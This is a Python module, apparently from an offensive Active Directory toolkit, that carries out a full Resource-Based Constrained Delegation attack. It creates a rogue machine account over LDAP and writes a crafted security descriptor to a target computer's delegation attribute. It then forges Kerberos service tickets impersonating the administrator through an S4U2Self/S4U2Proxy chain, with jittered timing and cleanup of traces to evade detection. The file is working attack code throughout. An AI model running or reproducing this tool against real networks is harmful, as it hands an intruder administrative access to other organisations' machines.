"""
modules/rbcd.py

Resource-Based Constrained Delegation (RBCD) exploitation module.
"""

import sys
import socket
from dataclasses import dataclass, field
from typing import Optional

from impacket.ldap import ldaptypes

from core.auth import AuthContext, AuthMethod, auth_password
from core.ldap import LDAPConnection, OpsecConfig, connect
from core.kerberos import full_s4u_chain, TicketResult, get_tgt
from utils.output import (
    info, success, warning, error, section, divider,
    print_ticket_result, is_json_mode, print_json,
)
from utils.opsec import OpsecCheck, jittered_sleep, print_operation_noise


@dataclass
class RBCDConfig:
    dc_ip:              str
    domain:             str
    target:             str
    impersonate:        str   = "administrator"
    target_spn:         Optional[str] = None
    delegate_account:   Optional[str] = None
    delegate_pass:      Optional[str] = None
    add_computer:       bool  = False
    new_computer_name:  Optional[str] = None
    new_computer_pass:  Optional[str] = None
    cleanup:            bool  = False
    opsec_check:        bool  = False
    delay_ms:           int   = 0
    jitter_pct:         int   = 0
    output_dir:         str   = "/tmp"
    use_ssl:            bool  = False


def _build_rbcd_security_descriptor(account_sid: str) -> bytes:
    """
    Build a security descriptor granting full control to account_sid,
    suitable for writing to msDS-AllowedToActOnBehalfOfOtherIdentity.
    Uses impacket.ldap.ldaptypes matching ldapattack.py reference.
    """
    nace = ldaptypes.ACE()
    nace["AceType"]  = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00

    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ldaptypes.ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"]  = ldaptypes.LDAP_SID()
    acedata["Sid"].fromCanonical(account_sid)
    nace["Ace"] = acedata

    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"]        = 0
    acl["Sbz2"]        = 0
    acl.aces = [nace]

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"]     = b"\x00"
    sd["Control"]  = 32772
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"]     = b""
    sd["Dacl"]     = acl

    return sd.getData()


def _verify_write_access(ldap_conn, target, auth):
    results = ldap_conn._query(
        f"(sAMAccountName={target})",
        ["distinguishedName", "sAMAccountName", "objectClass"],
    )
    if not results:
        target_dollar = target.rstrip("$") + "$"
        results = ldap_conn._query(
            f"(sAMAccountName={target_dollar})",
            ["distinguishedName", "sAMAccountName", "objectClass"],
        )
    if not results:
        error(f"Target computer '{target}' not found in {ldap_conn.domain}.")
        return False, None
    target_dn = results[0].get("distinguishedName")
    return True, target_dn


def _get_delegate_account_sid(ldap_conn, delegate_account):
    sid = ldap_conn.get_account_sid(delegate_account)
    if not sid:
        sid = ldap_conn.get_account_sid(delegate_account.rstrip("$") + "$")
    if not sid:
        error(f"Cannot resolve SID for delegation account '{delegate_account}'.")
    return sid


def _encode_password(password: str) -> bytes:
    return f'"{password}"'.encode("utf-16-le")


def _create_machine_account(ldap_conn, name, password, domain):
    import ldap3
    sam_name = name.rstrip("$") + "$"
    dn       = f"CN={name.rstrip('$')},CN=Computers,{ldap_conn.base_dn}"
    dns_name = f"{name.rstrip('$').lower()}.{domain.lower()}"

    try:
        ldap_conn._conn.add(
            dn,
            attributes={
                "objectClass":          ["top", "person", "organizationalPerson",
                                         "user", "computer"],
                "sAMAccountName":       sam_name,
                "userAccountControl":   "4096",
                "dNSHostName":          dns_name,
                "servicePrincipalName": [
                    f"HOST/{dns_name}",
                    f"RestrictedKrbHost/{dns_name}",
                ],
                "unicodePwd":           _encode_password(password),
            },
        )
    except Exception as e:
        error(f"Failed to create machine account '{sam_name}': {e}")
        return None

    if ldap_conn._conn.result["result"] != 0:
        desc = ldap_conn._conn.result.get("description", "unknown")
        error(f"Machine account creation failed: {desc}")
        return None

    success(f"Created machine account: {sam_name}")
    return sam_name


def _delete_machine_account(ldap_conn, sam_name):
    results = ldap_conn._query(f"(sAMAccountName={sam_name})", ["distinguishedName"])
    if not results:
        return False
    dn = results[0].get("distinguishedName")
    if not dn:
        return False
    try:
        ldap_conn._conn.delete(dn)
    except Exception:
        return False
    if ldap_conn._conn.result["result"] == 0:
        success(f"Deleted machine account: {sam_name}")
        return True
    return False


def _cleanup(ldap_conn, target_dn, machine_sam):
    info("Cleaning up RBCD configuration...")
    cleared = ldap_conn.clear_rbcd(target_dn)
    if cleared:
        success(f"Removed RBCD attribute from {target_dn}")
    else:
        warning("Failed to remove RBCD attribute — manual cleanup may be required")
    if machine_sam:
        _delete_machine_account(ldap_conn, machine_sam)


def _random_suffix(length=6):
    import random, string
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))


def _random_password(length=20):
    import random, string
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return "".join(random.choices(chars, k=length))


def run_rbcd(auth: AuthContext, config: RBCDConfig) -> Optional[TicketResult]:
    opsec      = OpsecCheck(enabled=config.opsec_check)
    ldap_opsec = OpsecConfig(delay_ms=config.delay_ms, jitter_pct=config.jitter_pct)

    target_clean = config.target.rstrip("$")
    target_spn   = config.target_spn or f"CIFS/{target_clean}.{config.domain}"

    section("RBCD Exploitation")
    info(f"Target computer  : {config.target}")
    info(f"Impersonating    : {config.impersonate}")
    info(f"Target SPN       : {target_spn}")
    info(f"Delegation source: {config.delegate_account or '(new machine account)'}")

    info("Connecting to LDAP...")
    try:
        ldap_conn = connect(
            auth=auth,
            dc_ip=config.dc_ip,
            domain=config.domain,
            opsec=ldap_opsec,
            use_ssl=config.use_ssl,
        )
    except SystemExit:
        raise
    except Exception as e:
        error(f"LDAP connection failed: {e}")
        return None

    success(f"Connected as {auth.upn}")

    info(f"Verifying write access over {config.target}...")
    has_access, target_dn = _verify_write_access(ldap_conn, config.target, auth)
    if not has_access or not target_dn:
        return None
    success(f"Target DN: {target_dn}")

    delegate_sam    = None
    delegate_pass   = config.delegate_pass
    created_account = False

    if config.add_computer:
        if not opsec.check("rbcd_write"):
            return None
        comp_name = config.new_computer_name or f"DELEGATOR-{_random_suffix()}"
        comp_pass = config.new_computer_pass or _random_password()
        info(f"Creating machine account: {comp_name}$")
        delegate_sam = _create_machine_account(ldap_conn, comp_name, comp_pass, config.domain)
        if not delegate_sam:
            return None
        delegate_pass   = comp_pass
        created_account = True

    elif config.delegate_account:
        delegate_sam = config.delegate_account
        if not delegate_pass:
            error("Delegation source account specified but no password provided.\n"
                  "  Use --delegate-pass to provide the account password.")
            return None
    else:
        error("No delegation source account specified.\n"
              "  Use --delegate-account <account> --delegate-pass <pass>\n"
              "  or use --add-computer to create a new machine account.")
        return None

    info(f"Resolving SID for {delegate_sam}...")
    delegate_sid = _get_delegate_account_sid(ldap_conn, delegate_sam)
    if not delegate_sid:
        if created_account:
            _delete_machine_account(ldap_conn, delegate_sam)
        return None
    info(f"Delegation account SID: {delegate_sid}")

    if not opsec.check("rbcd_write"):
        if created_account:
            _delete_machine_account(ldap_conn, delegate_sam)
        return None

    info(f"Writing RBCD attribute to {config.target}...")
    info("(Generates Event ID 5136 — highest noise operation)")

    sd_bytes = _build_rbcd_security_descriptor(delegate_sid)
    write_ok = ldap_conn.write_rbcd(target_dn, sd_bytes)
    if not write_ok:
        if created_account:
            _delete_machine_account(ldap_conn, delegate_sam)
        return None

    success(f"RBCD configured: {delegate_sam} can now delegate to {config.target}")

    if config.delay_ms > 0:
        info(f"Waiting {config.delay_ms}ms before S4U requests...")
        jittered_sleep(config.delay_ms, config.jitter_pct)

    delegate_auth = auth_password(
        username=delegate_sam.rstrip("$"),
        domain=config.domain,
        password=delegate_pass,
    )

    delegate_clean = delegate_sam.rstrip("$")
    delegate_spn   = f"HOST/{delegate_clean}.{config.domain}"

    info("Executing S4U2Self -> S4U2Proxy chain...")
    info(f"  Impersonating: {config.impersonate}")
    info(f"  Target SPN   : {target_spn}")

    try:
        ticket_result = full_s4u_chain(
            auth=delegate_auth,
            dc_ip=config.dc_ip,
            impersonate=config.impersonate,
            service_spn=delegate_spn,
            target_spn=target_spn,
            output_dir=config.output_dir,
        )
    except SystemExit:
        if config.cleanup:
            _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)
        raise
    except Exception as e:
        error(f"S4U chain failed: {e}")
        if config.cleanup:
            _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)
        return None

    success("S4U chain completed successfully")

    if config.cleanup:
        _cleanup(ldap_conn, target_dn, delegate_sam if created_account else None)

    ldap_conn.close()

    if not is_json_mode():
        print_ticket_result(
            ccache_path=ticket_result.ccache_path,
            impersonated_user=config.impersonate,
            target_spn=target_spn,
            netexec_cmd=ticket_result.netexec_command,
            impacket_cmd=ticket_result.impacket_command,
            delegation_type="RBCD",
        )
        print_operation_noise("rbcd_write")
        if config.cleanup:
            print_operation_noise("rbcd_cleanup")
    else:
        print_json({
            "type":           "rbcd",
            "impersonated":   config.impersonate,
            "target_spn":     target_spn,
            "ccache_path":    ticket_result.ccache_path,
            "export_command": ticket_result.export_command,
            "netexec":        ticket_result.netexec_command,
            "impacket":       ticket_result.impacket_command,
            "cleaned_up":     config.cleanup,
        })

    return ticket_result
